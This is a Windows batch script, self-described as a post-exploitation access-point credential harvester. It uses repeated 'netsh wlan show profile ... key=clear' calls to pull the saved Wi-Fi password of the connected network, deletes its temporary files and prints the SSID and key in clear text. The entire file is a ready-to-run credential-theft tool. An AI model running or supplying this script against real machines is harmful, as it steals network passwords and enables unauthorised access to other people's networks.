@echo off
title windows-post-exploitation-ap-credential-harvester
set blank=0
netsh wlan show interfaces | find "SSID                   :" >ap.txt
set /p ssid=<ap.txt
netsh wlan show profile "%ssid:~29,1%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,2%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,3%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,4%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,5%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,6%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,7%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,8%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,9%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,10%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,11%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,12%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,13%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,14%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
netsh wlan show profile "%ssid:~29,15%" key=clear | find "Key Content            :" >ssidkey.txt
set /A blank=%blank% + 1
Dir | findstr "ssidkey" >ap2.txt
set /p ssidkey=<ssidkey.txt
set /p digit=<ap2.txt
echo %digit:~37,1% >ap3.txt
set /p num=<ap3.txt
if %num% GTR 0 goto :trimmed
echo exploit failed :


:trimmed
cls
del ap.txt
del ap3.txt
del ap2.txt
del ssidkey.txt
echo.
echo =============================================================================
echo = [ Success!!! ] ============================================================
echo = [ Enumerated in %blank% tries] ==================================================
echo ============================================================================= 
echo =============================================================================
echo =============================================================================
echo           CONNECTED ACCESS POINT [%ssid:~29%] PASSWORD [%ssidkey:~29%]            
pause >nul
exit